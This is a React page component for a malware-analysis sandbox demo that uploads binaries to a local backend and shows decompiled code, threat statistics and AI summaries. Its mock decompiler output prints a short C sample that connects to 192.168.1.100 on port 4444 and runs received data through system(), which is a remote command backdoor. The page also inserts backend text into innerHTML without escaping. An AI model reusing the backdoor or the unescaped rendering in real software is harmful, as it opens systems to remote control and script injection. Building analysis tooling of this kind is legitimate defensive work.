import { useState, useRef, useEffect } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import { Upload, FileCode, CheckCircle, ShieldAlert, Bug, Terminal, Activity, FileSearch, Globe, FileText, Binary, Code, ChevronDown, ChevronUp, Download, Sparkles, GitBranch, X, Loader2 } from 'lucide-react'
import { Button } from '@/components/ui/button'

// Mock data for demo
const mockDecompilerResponse = {
    decompiled: `// Decompiled with Ghidra 10.3.2

int main(int argc, char **argv) {
    undefined8 local_18;
    undefined8 local_10;
    
    local_18 = 0x7478742e65706970;
    local_10 = 0;
    
    // Suspicious file path construction
    char *filename = "/tmp/.hidden";
    int fd = open(filename, O_WRONLY | O_CREAT, 0644);
    
    if (fd == -1) {
        perror("open");
        return -1;
    }
    
    // Potential data exfiltration
    write(fd, &local_18, 8);
    close(fd);
    
    // Network connection attempt
    struct sockaddr_in addr;
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(4444);
    inet_pton(AF_INET, "192.168.1.100", &addr.sin_addr);
    
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
        char buffer[1024];
        recv(sock, buffer, sizeof(buffer), 0);
        system(buffer);
    }
    
    return 0;
}`,
    objdump: `Disassembly of section .text:

0000000000001149 <main>:
    1149:	55                   	push   %rbp
    114a:	48 89 e5             	mov    %rsp,%rbp
    114d:	48 83 ec 20          	sub    $0x20,%rsp
    1151:	89 7d ec             	mov    %edi,-0x14(%rbp)
    1154:	48 89 75 e0          	mov    %rsi,-0x20(%rbp)
    1158:	48 b8 70 69 70 65 2e 	movabs $0x7478742e65706970,%rax
    115f:	74 78 74 
    1162:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
    1166:	48 c7 45 f8 00 00 00 	movq   $0x0,-0x8(%rbp)
    116d:	00 
    116e:	48 8d 3d 8f 0e 00 00 	lea    0xe8f(%rip),%rdi
    1175:	b8 41 02 00 00       	mov    $0x241,%eax
    117a:	ba a4 01 00 00       	mov    $0x1a4,%edx
    117f:	be 41 02 00 00       	mov    $0x241,%esi
    1184:	e8 c7 fe ff ff       	callq  1050 <open@plt>`
}

const mockAnalysisResponse = {
    report: {
        data: {
            attributes: {
                stats: {
                    malicious: 8,
                    suspicious: 12,
                    harmless: 45,
                    undetected: 10
                }
            }
        },
        meta: {
            file_info: {
                sha256: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
                md5: "d41d8cd98f00b204e9800998ecf8427e",
                size: 12894
            }
        }
    }
}

// Initialize mermaid (if using actual mermaid library)
// mermaid.initialize({
//     startOnLoad: false,
//     theme: 'dark',
//     securityLevel: 'loose',
//     themeVariables: {
//         primaryColor: '#39FF14',
//         primaryTextColor: '#fff',
//         primaryBorderColor: '#39FF14',
//         lineColor: '#666',
//         secondaryColor: '#1a1a2e',
//         tertiaryColor: '#0a0e17',
//         background: '#0a0e17',
//         mainBkg: '#1a1a2e',
//         nodeBorder: '#39FF14',
//         clusterBkg: '#1a1a2e',
//         clusterBorder: '#333',
//         titleColor: '#39FF14',
//         edgeLabelBackground: '#1a1a2e',
//     }
// })

const TerminalLine = ({ text, delay = 0, color = 'text-gray-400' }) => (
    <motion.div
        initial={{ opacity: 0, x: -10 }}
        animate={{ opacity: 1, x: 0 }}
        transition={{ delay, duration: 0.3 }}
        className={`font-mono text-xs ${color}`}
    >
        <span className="text-gray-600 mr-2">$</span>
        {text}
    </motion.div>
)

export default function MalwareAnalysisPage() {
    const [file, setFile] = useState(null)
    const [analyzing, setAnalyzing] = useState(false)
    const [decompiledData, setDecompiledData] = useState(null)
    const [analysisReport, setAnalysisReport] = useState(null)
    const [logs, setLogs] = useState([])
    const [error, setError] = useState(null)
    const [activeTab, setActiveTab] = useState('decompiled')
    const [isExpanded, setIsExpanded] = useState(false)
    const [aiSummaryExpanded, setAiSummaryExpanded] = useState(false)
    const fileInputRef = useRef(null)

    // New states for AI features
    const [aiSummary, setAiSummary] = useState(null)
    const [aiSummaryLoading, setAiSummaryLoading] = useState(false)
    const [diagram, setDiagram] = useState(null)
    const [diagramLoading, setDiagramLoading] = useState(false)
    const [pdfGenerating, setPdfGenerating] = useState(false)

    const diagramRef = useRef(null)

    const allowedExtensions = ['exe', 'dll', 'so', 'elf', 'bin', 'o', 'out']

    const validateFile = (fileName) => {
        const extension = fileName.split('.').pop().toLowerCase()
        if (!allowedExtensions.includes(extension)) {
            setError(`Invalid file type. Allowed: ${allowedExtensions.join(', ').toUpperCase()}`)
            return false
        }
        setError(null)
        return true
    }

    const handleFileSelect = (e) => {
        if (e.target.files && e.target.files[0]) {
            const selectedFile = e.target.files[0]
            if (validateFile(selectedFile.name)) {
                setFile({
                    name: selectedFile.name,
                    size: (selectedFile.size / (1024 * 1024)).toFixed(2) + ' MB',
                    rawFile: selectedFile,
                    isExample: false
                })
            }
        }
    }

    const handleFileDrop = (e) => {
        e.preventDefault()
        const droppedFile = e.dataTransfer.files[0]
        if (droppedFile) {
            if (validateFile(droppedFile.name)) {
                setFile({
                    name: droppedFile.name,
                    size: (droppedFile.size / (1024 * 1024)).toFixed(2) + ' MB',
                    rawFile: droppedFile,
                    isExample: false
                })
            }
        }
    }

    const addLog = (text, color = 'text-gray-400') => {
        setLogs(prev => [...prev, { text, color }])
    }

    // Scroll to section helper
    const scrollToSection = (id) => {
        const element = document.getElementById(id)
        if (element) {
            element.scrollIntoView({ behavior: 'smooth', block: 'start' })
        }
    }

    // Generate AI Summary
    const generateAiSummary = async () => {
        if (!file?.rawFile) return
        setAiSummaryLoading(true)
        setAiSummary(null)

        try {
            const formData = new FormData()
            formData.append('file', file.rawFile)

            const res = await fetch('http://localhost:5000/api/malware-analyzer/ai-summary', {
                method: 'POST',
                body: formData
            })

            if (!res.ok) throw new Error(`API error: ${res.statusText}`)
            const data = await res.json()

            if (data.success) {
                setAiSummary(data.ai_response)
                setTimeout(() => scrollToSection('ai-summary-section'), 100)
            } else {
                throw new Error(data.error || 'Failed to generate summary')
            }
        } catch (err) {
            setError(err.message)
        } finally {
            setAiSummaryLoading(false)
        }
    }

    // Generate Diagram
    const generateDiagram = async () => {
        if (!file?.rawFile) return
        setDiagramLoading(true)
        setDiagram(null)

        try {
            const formData = new FormData()
            formData.append('file', file.rawFile)

            const res = await fetch('http://localhost:5000/api/malware-analyzer/diagram-generator', {
                method: 'POST',
                body: formData
            })

            if (!res.ok) throw new Error(`API error: ${res.statusText}`)
            const data = await res.json()

            if (data.success) {
                setDiagram(data.ai_response)
                setTimeout(() => scrollToSection('flow-diagram-section'), 100)
            } else {
                throw new Error(data.error || 'Failed to generate diagram')
            }
        } catch (err) {
            setError(err.message)
        } finally {
            setDiagramLoading(false)
        }
    }

    // Render mermaid diagram when it changes
    useEffect(() => {
        if (diagram && diagramRef.current) {
            const renderDiagram = async () => {
                try {
                    diagramRef.current.innerHTML = ''
                    // If using actual mermaid:
                    // const id = `mermaid-${Date.now()}`
                    // const { svg } = await mermaid.render(id, diagram)
                    // diagramRef.current.innerHTML = svg
                    
                    // For demo, show the mermaid code
                    diagramRef.current.innerHTML = `<pre class="text-sm text-gray-300 p-4 bg-slate-900 rounded">${diagram}</pre>`
                } catch (err) {
                    console.error('Mermaid render error:', err)
                    diagramRef.current.innerHTML = `<pre class="text-red-500 text-sm p-4">${err.message}</pre>`
                }
            }
            renderDiagram()
        }
    }, [diagram])

    const handleScan = async () => {
        if (!file) return
        setAnalyzing(true)
        setLogs([])
        setDecompiledData(null)
        setAnalysisReport(null)
        setAiSummary(null)
        setDiagram(null)
        setError(null)

        if (file.isExample) {
            const logSequence = [
                { text: `[+] Initializing static analysis engine...`, delay: 0.2 },
                { text: `[+] Uploading ${file.name} to sandbox...`, delay: 0.8 },
                { text: `[*] Parsing ELF header structure...`, delay: 1.5 },
                { text: `[*] Disassembling .text section...`, delay: 2.2 },
                { text: `[*] Reconstructing control flow graph...`, delay: 3.0 },
                { text: `[*] Extracting symbol table...`, delay: 3.8 },
                { text: `[*] Analyzing entropy and sections...`, delay: 4.5 },
                { text: `[+] Querying threat intelligence database...`, delay: 5.2 },
                { text: `[!] Suspicious system calls detected...`, delay: 6.0, color: 'text-yellow-500' },
                { text: `[+] Generating decompilation report...`, delay: 6.8 }
            ]
            logSequence.forEach((log) => {
                setTimeout(() => addLog(log.text, log.color), log.delay * 1000)
            })
            setTimeout(() => {
                setDecompiledData(mockDecompilerResponse)
                setAnalysisReport(mockAnalysisResponse)
                setAnalyzing(false)
            }, 7500)
            return
        }

        addLog(`[+] Initializing static analysis engine...`)
        addLog(`[+] Uploading ${file.name} to backend...`)

        const decompileFormData = new FormData()
        decompileFormData.append('file', file.rawFile)

        const analyzerFormData = new FormData()
        analyzerFormData.append('file', file.rawFile)

        try {
            addLog(`[*] Calling decompilation & threat analysis services (parallel)...`)

            const [decompileRes, analyzerRes] = await Promise.all([
                fetch('http://localhost:5000/api/malware-analyzer/decompile', {
                    method: 'POST',
                    body: decompileFormData
                }),
                fetch('http://localhost:5000/api/malware-analyzer/file-analysis', {
                    method: 'POST',
                    body: analyzerFormData
                })
            ])

            if (!decompileRes.ok) throw new Error(`Decompile API error: ${decompileRes.statusText}`)
            if (!analyzerRes.ok) throw new Error(`Analyzer API error: ${analyzerRes.statusText}`)

            const [decompileJson, analyzerJson] = await Promise.all([
                decompileRes.json(),
                analyzerRes.json()
            ])

            addLog(`[+] Decompilation complete.`, 'text-green-500')
            addLog(`[+] Threat analysis complete.`, 'text-green-500')

            setDecompiledData(decompileJson)
            setAnalysisReport(analyzerJson)

        } catch (err) {
            addLog(`[!] Error: ${err.message}`, 'text-red-500')
            setError(err.message)
        } finally {
            setAnalyzing(false)
        }
    }

    return (
        <div className="max-w-7xl mx-auto space-y-8 pb-20 p-6 bg-slate-950 min-h-screen">

            {/* Header */}
            <div className="flex items-center justify-between">
                <div>
                    <h2 className="text-2xl font-bold text-white flex items-center gap-3">
                        <Bug className="text-green-500" /> Malware Sandbox
                    </h2>
                    <p className="text-gray-400">Static & Dynamic Analysis Environment</p>
                </div>
                <div className="flex gap-2 items-center">
                    <div className="px-3 py-1 rounded bg-red-500/10 border border-red-500/20 text-red-500 text-xs font-mono flex items-center gap-2">
                        <ShieldAlert size={14} /> LIVE DECOMPILATION PREPARED
                    </div>
                </div>
            </div>

            {/* Dynamic Layout Container */}
            <div className={analyzing || decompiledData ? "grid grid-cols-1 lg:grid-cols-12 gap-6" : "max-w-xl mx-auto mt-20"}>

                {/* Left Column: Upload & Control */}
                <div className={analyzing || decompiledData ? "lg:col-span-4 space-y-6" : "space-y-6"}>

                    <input type="file" ref={fileInputRef} className="hidden" onChange={handleFileSelect} />

                    {/* Upload Zone */}
                    <motion.div
                        layout
                        className={`border-2 border-dashed rounded-xl p-8 flex flex-col items-center justify-center text-center transition-all cursor-pointer relative overflow-hidden
                            ${file ? 'border-green-500/50 bg-green-500/5' : 'border-gray-700 hover:border-gray-600 hover:bg-gray-900/50'}
                            ${analyzing ? 'pointer-events-none opacity-50' : ''}`}
                        onDragOver={(e) => e.preventDefault()}
                        onDrop={handleFileDrop}
                        onClick={() => !file && fileInputRef.current?.click()}
                    >
                        {file ? (
                            <>
                                <FileCode className="w-12 h-12 text-green-500 mb-4" />
                                <div className="font-mono text-white mb-1">{file.name}</div>
                                <div className="text-xs text-gray-500">{file.size}</div>
                                <button 
                                    className="mt-4 text-xs h-8 px-4 border border-gray-700 rounded hover:bg-gray-800 text-gray-300"
                                    onClick={(e) => { 
                                        e.stopPropagation(); 
                                        setFile(null); 
                                        setDecompiledData(null); 
                                        setAnalysisReport(null); 
                                        setAiSummary(null); 
                                        setDiagram(null); 
                                        setError(null); 
                                    }}
                                >
                                    Remove
                                </button>
                            </>
                        ) : (
                            <>
                                <Upload className="w-12 h-12 text-gray-600 mb-4" />
                                <div className="text-gray-400 mb-2">Drop file to analyze</div>
                                <div className="text-xs text-gray-500 font-mono mb-4">OR CLICK TO UPLOAD</div>
                                <div className="mt-6 text-[10px] text-gray-500 font-mono border border-gray-800 px-2 py-1 rounded">
                                    SUPPORTED: {allowedExtensions.map(e => e.toUpperCase()).join(', ')}
                                </div>
                                {error && (
                                    <motion.div initial={{ opacity: 0, y: 5 }} animate={{ opacity: 1, y: 0 }} className="mt-4 text-xs text-red-500 bg-red-500/10 px-3 py-2 rounded border border-red-500/20 flex items-center gap-2">
                                        <ShieldAlert size={12} /> {error}
                                    </motion.div>
                                )}
                            </>
                        )}
                    </motion.div>

                    <button 
                        className="w-full h-12 text-lg bg-green-500 hover:bg-green-600 disabled:bg-gray-700 disabled:text-gray-500 text-black font-semibold rounded-lg transition-all"
                        disabled={!file || analyzing} 
                        onClick={handleScan}
                    >
                        {analyzing ? <span className="flex items-center gap-2 justify-center"><Activity className="animate-spin" /> Analyzing...</span> : 'Submit File'}
                    </button>

                    {/* Terminal Log */}
                    {(analyzing || decompiledData) && (
                        <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className="rounded-xl border border-gray-800 bg-black p-4 font-mono h-[300px] overflow-y-auto relative">
                            <div className="absolute top-2 right-4 text-xs text-gray-600 flex items-center gap-1"><Terminal size={12} /> STATIC ANALYSIS LOG</div>
                            <div className="space-y-1 mt-4">
                                {logs.map((log, i) => <TerminalLine key={i} text={log.text} color={log.color} />)}
                                {analyzing && <motion.div animate={{ opacity: [0, 1, 0] }} transition={{ duration: 0.8, repeat: Infinity }} className="w-2 h-4 bg-green-500 mt-1 inline-block" />}
                            </div>
                        </motion.div>
                    )}

                    {/* Threat Intelligence & AI Buttons */}
                    {analysisReport && (
                        <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="space-y-4">
                            <div className="p-4 rounded-xl border border-gray-800 bg-gray-900/30">
                                <h4 className="text-sm font-bold text-white mb-3 flex items-center gap-2"><ShieldAlert size={14} className="text-red-500" /> Threat Intelligence</h4>
                                <div className="flex justify-between items-center mb-4">
                                    <div className="text-center"><div className="text-2xl font-bold text-red-500">{analysisReport.report.data.attributes.stats.malicious}</div><div className="text-[10px] text-gray-500 uppercase">Malicious</div></div>
                                    <div className="text-center"><div className="text-2xl font-bold text-yellow-500">{analysisReport.report.data.attributes.stats.suspicious}</div><div className="text-[10px] text-gray-500 uppercase">Suspicious</div></div>
                                    <div className="text-center"><div className="text-2xl font-bold text-green-500">{analysisReport.report.data.attributes.stats.harmless}</div><div className="text-[10px] text-gray-500 uppercase">Harmless</div></div>
                                </div>
                                <div className="text-xs font-mono text-gray-400 space-y-1 border-t border-gray-800 pt-3">
                                    <div className="flex justify-between"><span>SHA256:</span> <span className="text-white">{analysisReport.report.meta.file_info.sha256.substring(0, 12)}...</span></div>
                                    <div className="flex justify-between"><span>Size:</span> <span className="text-white">{analysisReport.report.meta.file_info.size} bytes</span></div>
                                    <div className="flex justify-between"><span>Format:</span> <span className="text-white">ELF 64-bit</span></div>
                                </div>
                            </div>

                            {/* AI Features Box */}
                            <div className="p-4 rounded-xl border border-gray-800 bg-gray-900">
                                <h4 className="text-sm font-bold text-white mb-3 flex items-center gap-2"><Sparkles size={14} className="text-green-500" /> AI-Powered Insights</h4>
                                <div className="space-y-2">
                                    <button onClick={generateDiagram} disabled={diagramLoading || !file?.rawFile} className="w-full p-3 rounded-lg border border-gray-800 bg-black/50 hover:bg-gray-800/50 hover:border-green-500/30 transition-all flex items-center justify-between group disabled:opacity-50 disabled:cursor-not-allowed">
                                        <div className="flex items-center gap-3">
                                            <div className="w-8 h-8 rounded-lg bg-cyan-500/20 flex items-center justify-center"><GitBranch size={16} className="text-cyan-400" /></div>
                                            <div className="text-left"><div className="text-sm font-medium text-white">Flow Diagram</div><div className="text-xs text-gray-500">Visualize execution flow</div></div>
                                        </div>
                                        {diagramLoading ? <Loader2 size={16} className="animate-spin text-cyan-400" /> : <ChevronDown size={16} className="text-gray-500 group-hover:text-green-500 transition-colors" />}
                                    </button>
                                    <button onClick={generateAiSummary} disabled={aiSummaryLoading || !file?.rawFile} className="w-full p-3 rounded-lg border border-gray-800 bg-black/50 hover:bg-gray-800/50 hover:border-green-500/30 transition-all flex items-center justify-between group disabled:opacity-50 disabled:cursor-not-allowed">
                                        <div className="flex items-center gap-3">
                                            <div className="w-8 h-8 rounded-lg bg-purple-500/20 flex items-center justify-center"><Sparkles size={16} className="text-purple-400" /></div>
                                            <div className="text-left"><div className="text-sm font-medium text-white">AI Summary</div><div className="text-xs text-gray-500">Generate threat analysis</div></div>
                                        </div>
                                        {aiSummaryLoading ? <Loader2 size={16} className="animate-spin text-purple-400" /> : <ChevronDown size={16} className="text-gray-500 group-hover:text-green-500 transition-colors" />}
                                    </button>
                                </div>
                            </div>
                        </motion.div>
                    )}
                </div>

                {/* Right Column: Results Stack */}
                {(analyzing || decompiledData) && (
                    <div className="lg:col-span-8 flex flex-col gap-6 min-h-[600px]">

                        {/* 1. Flow Diagram - FIRST (Always expanded when available) */}
                        {diagram && (
                            <motion.div 
                                id="flow-diagram-section" 
                                initial={{ opacity: 0, y: 20 }} 
                                animate={{ opacity: 1, y: 0 }} 
                                className="flex flex-col bg-gray-900 rounded-xl border border-gray-800 overflow-hidden shadow-2xl"
                            >
                                <div className="flex items-center justify-between px-4 py-2 bg-gray-800 border-b border-gray-700">
                                    <div className="flex items-center gap-2">
                                        <GitBranch size={14} className="text-cyan-400" />
                                        <span className="text-xs font-mono font-bold text-white">EXECUTION_FLOW_GRAPH</span>
                                    </div>
                                    <div className="text-[10px] text-gray-500 font-mono">MERMAID.JS</div>
                                </div>
                                <div className="p-6 bg-slate-900 overflow-x-auto flex items-center justify-center min-h-[400px]">
                                    <div ref={diagramRef} className="mermaid-container w-full flex items-center justify-center" />
                                </div>
                            </motion.div>
                        )}

                        {/* 2. Decompiled Code - MIDDLE */}
                        {!decompiledData ? (
                            <div className="h-full rounded-xl border border-gray-800 bg-gray-900/20 flex flex-col items-center justify-center text-gray-600 animate-pulse min-h-[600px]">
                                <Code className="w-24 h-24 mb-4 opacity-20" />
                                <p>Decompiling binary...</p>
                                <p className="text-xs mt-2">Running objdump & Ghidra analysis</p>
                            </div>
                        ) : (
                            <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex flex-col bg-gray-900 rounded-xl border border-gray-800 overflow-hidden shadow-2xl">
                                <div className="flex items-center justify-between px-4 py-2 bg-gray-800 border-b border-gray-700">
                                    <div className="flex items-center gap-1">
                                        <button onClick={() => setActiveTab('decompiled')} className={`px-3 py-1.5 text-xs font-mono flex items-center gap-2 rounded-t transition-colors ${activeTab === 'decompiled' ? 'bg-gray-900 text-green-500' : 'text-gray-500 hover:text-gray-300'}`}><Code size={12} /> pseudo_code.c</button>
                                        <button onClick={() => setActiveTab('objdump')} className={`px-3 py-1.5 text-xs font-mono flex items-center gap-2 rounded-t transition-colors ${activeTab === 'objdump' ? 'bg-gray-900 text-yellow-500' : 'text-gray-500 hover:text-gray-300'}`}><Binary size={12} /> disassembly.asm</button>
                                    </div>
                                    <div className="text-[10px] text-gray-500 font-mono">READ-ONLY</div>
                                </div>
                                <div className={`relative p-4 font-mono text-sm bg-gray-900 ${isExpanded ? '' : 'max-h-[600px] overflow-hidden'}`}>
                                    <pre className="text-gray-300 leading-relaxed overflow-x-auto"><code>{activeTab === 'decompiled' ? decompiledData.decompiled : decompiledData.objdump}</code></pre>
                                    {!isExpanded && <div className="absolute inset-x-0 bottom-0 h-40 bg-gradient-to-t from-gray-900 via-gray-900/80 to-transparent pointer-events-none" />}
                                </div>
                                <div className="bg-gray-900 border-t border-gray-800 p-2 flex justify-center sticky bottom-0 z-10">
                                    <button onClick={() => setIsExpanded(!isExpanded)} className="flex items-center gap-2 px-4 py-2 text-xs font-mono text-green-500 hover:bg-green-500/10 rounded transition-colors">
                                        {isExpanded ? <><ChevronUp size={14} /> Show Less</> : <><ChevronDown size={14} /> Show Full Source</>}
                                    </button>
                                </div>
                            </motion.div>
                        )}

                        {/* 3. AI Summary - LAST (Code Editor Style, Always expanded when available) */}
                        {aiSummary && (
                            <motion.div 
                                id="ai-summary-section" 
                                initial={{ opacity: 0, y: 20 }} 
                                animate={{ opacity: 1, y: 0 }} 
                                className="flex flex-col bg-gray-900 rounded-xl border border-gray-800 overflow-hidden shadow-2xl"
                            >
                                <div className="flex items-center justify-between px-4 py-2 bg-gray-800 border-b border-gray-700">
                                    <div className="flex items-center gap-2">
                                        <Sparkles size={14} className="text-purple-400" />
                                        <span className="text-xs font-mono font-bold text-white">THREAT_SUMMARY.MD</span>
                                    </div>
                                    <div className="text-[10px] text-gray-500 font-mono">AI-GENERATED</div>
                                </div>
                                <div className={`relative p-4 font-mono text-sm bg-gray-900 ${aiSummaryExpanded ? '' : 'max-h-[500px] overflow-hidden'}`}>
                                    <pre className="text-gray-300 leading-relaxed overflow-x-auto whitespace-pre-wrap"><code>{aiSummary}</code></pre>
                                    {!aiSummaryExpanded && <div className="absolute inset-x-0 bottom-0 h-40 bg-gradient-to-t from-gray-900 via-gray-900/80 to-transparent pointer-events-none" />}
                                </div>
                                <div className="bg-gray-900 border-t border-gray-800 p-2 flex justify-center sticky bottom-0 z-10">
                                    <button onClick={() => setAiSummaryExpanded(!aiSummaryExpanded)} className="flex items-center gap-2 px-4 py-2 text-xs font-mono text-purple-400 hover:bg-purple-500/10 rounded transition-colors">
                                        {aiSummaryExpanded ? <><ChevronUp size={14} /> Show Less</> : <><ChevronDown size={14} /> Show Full Summary</>}
                                    </button>
                                </div>
                            </motion.div>
                        )}
                    </div>
                )}
            </div>
        </div>
    )
}